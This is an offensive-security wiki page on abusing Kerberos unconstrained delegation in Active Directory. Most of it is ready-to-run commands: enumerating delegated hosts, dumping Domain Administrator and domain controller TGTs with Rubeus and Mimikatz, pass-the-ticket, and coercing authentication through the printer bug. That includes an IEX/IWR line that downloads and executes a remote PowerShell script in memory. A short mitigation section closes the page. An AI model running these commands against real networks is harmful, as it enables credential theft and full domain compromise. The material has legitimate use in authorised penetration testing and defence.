# Unconstrained Delegation

## Description

Kerberos delegation in Active Directory refers to the ability of an object, such as a user or computer, to reuse end-user credentials for accessing resources hosted on a different server.

Unconstrained Delegation occurs when a computer, such as a File Server, has the "Trust this computer for delegation to any service" option enabled, and a Domain Administrator logs into the File Server. This enables us to grab a copy of the Domain Administrator's TGT, which can be used to authenticate anywhere in the Domain.

{% hint style="info" %}
Domain Controllers will always have TrustedForDelegation enabled.
{% endhint %}

## **Requirements**

Elevated privileges on the host that is configured for Unconstrained Delegation.

## **Enumeration**

{% code overflow="wrap" %}
```powershell
# PowerView
Get-DomainComputer -Unconstrained -Properties dnshostname,samaccountname |FL

# PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Select DNSHostName,SamAccountName | FL
```
{% endcode %}

## **Explanation**&#x20;

### **Without Unconstrained Delegation**

When a system is not configured for unconstrained delegation, typically only a Ticket Granting Service (TGS) ticket for the relevant service is stored on the system when a user authenticates through Kerberos. This ticket can only be used to authenticate to the same service on that same system and cannot be used to authenticate to other services or systems within the domain.

If we were to extract the TGS ticket for the Domain Administrator from the system below, we could only use that ticket to authenticate through the HTTP service on that same system. This is not really useful since the Domain Administrator already has elevated privileges on the system.

<figure><img src="../../../../.gitbook/assets/image (16) (4).png" alt=""><figcaption></figcaption></figure>

### **With Unconstrained Delegation**

When a system is configured for Unconstrained Delegation and a user, such as the Domain Administrator, connects to the system through a protocol like WinRM or CIFS, the TGT for the user account may be stored on the system.

If an attacker can gain access to this TGT, either by compromising the system or using other techniques, they can potentially use it to impersonate the user and access resources anywhere in the domain. This is known as a Pass-the-Ticket (PtT) attack.

In the image below, the Domain Administrator connected to the system through WinRM, and a TGT for this account can now be extracted from the system.

<figure><img src="../../../../.gitbook/assets/image (12) (1) (3).png" alt=""><figcaption></figcaption></figure>

## **Ticket Acquisition**

{% tabs %}
{% tab title="Rubeus Binary" %}
```bash
# Triage for existing tickets
Rubeus.exe triage

# Dump tickets for selected user,service or LUID
Rubeus.exe dump /nowrap /user:administrator
Rubeus.exe dump /nowrap /service:krbtgt
Rubeus.exe dump /nowrap /luid:0x6ee60

# Monitor for and dump new tickets
Rubeus.exe monitor interval:15 /nowrap
Rubeus.exe monitor interval:15 /nowrap /targetuser:administrator
```
{% endtab %}

{% tab title="Invoke-Rubeus" %}
```powershell
# Triage for existing tickets
Invoke-Rubeus -Command "triage"

# Dump tickets for selected user,service or LUID
Invoke-Rubeus -Command "dump /nowrap /user:administrator"
Invoke-Rubeus -Command "dump /nowrap /service:krbtgt"
Invoke-Rubeus -Command "dump /nowrap /luid:0x6ee60"

# Monitor for and dump new tickets
Invoke-Rubeus -Command "monitor interval:15 /nowrap"
Invoke-Rubeus -Command "monitor interval:15 /nowrap /targetuser:administrator"
```
{% endtab %}

{% tab title="Mimikatz Binary" %}
```bash
# Export tickets (Preferred Method (More Accurate))
mimikatz.exe "token::elevate" "sekurlsa::tickets /export"

# Alternative Method
mimikatz.exe "token::elevate" "kerberos::list /export"
```
{% endtab %}

{% tab title="Invoke-Mimikatz" %}
```powershell
# Export tickets (Preferred Method (More Accurate))
Invoke-Mimikatz -Command '"token::elevate "sekurlsa::tickets /export"'

# Alternative Method
Invoke-Mimikatz -Command '""token::elevate" "kerberos::list /export"'
```
{% endtab %}
{% endtabs %}

<figure><img src="../../../../.gitbook/assets/image (5) (6).png" alt=""><figcaption></figcaption></figure>

## Pass the Ticket (ptT)

{% tabs %}
{% tab title="Rubeus Binary" %}
{% code overflow="wrap" %}
```bash
# Method 1: Pass ticket into seperate session (Preffered)
# Create new LUID session (Requires Elevation)
Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe /show

# Pass ticket into new session
Rubeus.exe ptt /luid:[LUID from previous command] /ticket:[Base64 ticket]

# Method 2: Pass ticket directly into current session (Can cause auth issues)
Rubeus.exe ptt /ticket:[Base64 ticket]
```
{% endcode %}
{% endtab %}

{% tab title="Invoke-Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Method 1: Pass ticket into seperate session (Preffered)
# Create new LUID session (Requires Elevation)
Invoke-Rubeus -Command "createnetonly /program:c:\windows\system32\cmd.exe /show"

# Pass ticket into new session
Invoke-Rubeus -Command "ptt /luid:[LUID from previous command] /ticket:[Base64 ticket]"

# Method 2: Pass ticket directly into current session (Can cause auth issues)
Invoke-Rubeus -Command "ptt /ticket:[Base64 ticket]"
```
{% endcode %}
{% endtab %}

{% tab title="Mimikatz Binary" %}
```bash
# Pass ticket into current session
kerberos::ptt [Ticket-Name.kirbi]

# Confirm if ticket has been stored
kerberos::list

# Open new session with injected ticket
misc::cmd
```
{% endtab %}

{% tab title="Invoke-Mimikatz" %}
```powershell
# Pass ticket into current session
Invoke-Mimikatz -Command '"kerberos::ptt [Ticket-Name.kirbi]"'

# Confirm if ticket has been stored
Invoke-Mimikatz -Command '"kerberos::list"'

# Open new session with injected ticket
Invoke-Mimikatz -Command '"misc::cmd"'
```
{% endtab %}
{% endtabs %}

<figure><img src="../../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

With effective Domain Administrator permissions from the imported TGT we can now proceed with lateral movement, such as using WinRM:

<figure><img src="../../../../.gitbook/assets/image (8) (1) (5).png" alt=""><figcaption></figcaption></figure>





## Forced Authentication

When a system has Unconstrained Delegation enabled, a potential attack vector is to force other users or systems to authenticate against the host which is configured for unconstrained delegation.

By doing so we can force the victim user / computer account to store a copy of their TGT into the compromised system.

### Printer Bug

#### **Identify vulnerable systems**

Firstly, obtain a list of computers or servers within the domain to test.

```powershell
# PowerView
# Get all computers
Get-DomainComputer -Properties DnsHostName,OperatingSystem | Where {$_.OperatingSystem -Notlike "*server*"} | Select DnsHostname | Out-File DomainComputers.txt -Encoding "ASCII"

# Get all servers
Get-DomainComputer -Properties DnsHostName,OperatingSystem | Where {$_.OperatingSystem -like "*server*"} | Select DnsHostname | Out-File DomainServers.txt -Encoding "ASCII"
```

[Get-SpoolStatus.ps1](https://raw.githubusercontent.com/NotMedic/NetNTLMtoSilverTicket/master/Get-SpoolStatus.ps1) can then be used to iterate through and check for vulnerable servers.

```powershell
Get-SpoolStatus
ForEach ($Server in Get-Content DomainServers.txt) {Get-SpoolStatus $Server}
```

<figure><img src="../../../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

#### Set Rubeus for ticket harvesting

{% tabs %}
{% tab title="Rubeus Binary" %}
```bash
Rubeus.exe monitor /Interval:5 /nowrap
Rubeus.exe monitor /Interval:5 /nowrap /targetuser:DC01
```
{% endtab %}

{% tab title="Invoke-Rubeus" %}
```powershell
Invoke-Rubeus -Command "monitor /Interval:5 /nowrap"
Invoke-Rubeus -Command "monitor /Interval:5 /nowrap /targetuser:DC01"
```
{% endtab %}
{% endtabs %}

#### **Perform Forced Authentication**

{% tabs %}
{% tab title="Invoke-SpoolSample" %}
```powershell
# Load into memory
IEX (IWR -UseBasicParsing https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Spoolsample.ps1)

# Execute
Invoke-SpoolSample -Command "[Target Sever] [Listening Host]"
```

<figure><img src="../../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="SharpSpoolTrigger" %}
**GitHub:** [https://github.com/cube0x0/SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers)

```bash
# Execute
SharpSpoolTrigger.exe [Target Sever] [Listening Host]
```
{% endtab %}
{% endtabs %}

#### Collect Tickets

After using one of the above methods to force authentication we soon collect a TGT for the Domain Controller DC01. We can then impersonate this using Pass the Ticket.

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Mitigation

1. **Disable Unconstrained Delegation:** Organizations should identify all computers and services that have Unconstrained Delegation enabled and disable it whenever possible. Instead, organizations can use Constrained Delegation or Resource-Based Constrained Delegation to limit the scope of delegation.
2. **Use Constrained Delegation:** Constrained Delegation allows users and services to delegate authentication to specific services on specific computers. This ensures that the user or service only has access to the specific resources required to perform their tasks.
3. **Use Resource-Based Constrained Delegation:** Resource-Based Constrained Delegation allows services to delegate authentication to other services without requiring the use of a domain account. This allows organizations to limit the scope of delegation and reduce the risk of credential theft.
4. **Use Protected Users group:** Protected Users group is a security group that enforces stronger authentication and reduces the risk of credential theft. Members of the Protected Users group cannot be delegated to other computers or services. (Note: a TGT ticket for a protected user will still exist in memory from an interactive logon session. This means if as a user in the protected users group connects through RDP or physical logon, the TGT can be extracted and impersonated still.)
5. **Regularly review and monitor delegation settings:** Organizations should regularly review and monitor delegation settings to ensure that they are configured correctly and that there are no unintended consequences.

By implementing these mitigation's, organizations can reduce the risk of credential theft and unauthorized access to sensitive resources in their environment.

## References

{% embed url="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1" %}

{% embed url="https://stealthbits.com/blog/unconstrained-delegation-permissions" %}

{% embed url="https://docs.microsoft.com/en-us/archive/blogs/autz_auth_stuff/kerberos-delegation" %}
